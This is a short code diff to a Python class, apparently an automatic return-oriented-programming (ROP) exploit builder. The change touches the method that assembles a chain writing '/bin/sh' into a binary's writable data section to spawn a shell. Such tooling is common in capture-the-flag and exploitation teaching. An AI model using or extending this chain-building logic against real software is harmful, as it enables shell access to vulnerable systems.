@@ -176,12 +176,13 @@ class ROP:
         prim = self.get_primitives_str().split('mov qword ptr')[1].split(';')[0][2:].split(',')
         return [prim[0][:2], prim[1]]
     def get_writeable_mem(self):
-        return self.elf.sym['__data_start']
+        return self.analysis.elf.sym['__data_start']
 
     def do_the_thing(self):
         ret = b''
         ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
-        ret += self.fill_reg(self.get_primitive_regs()[1], '/bin/sh\0')
+        ret += self.fill_reg(self.get_primitive_regs()[1].strip(' '), '/bin/sh\0')
+        ret += self.get_primitives()
         return ret
             
 
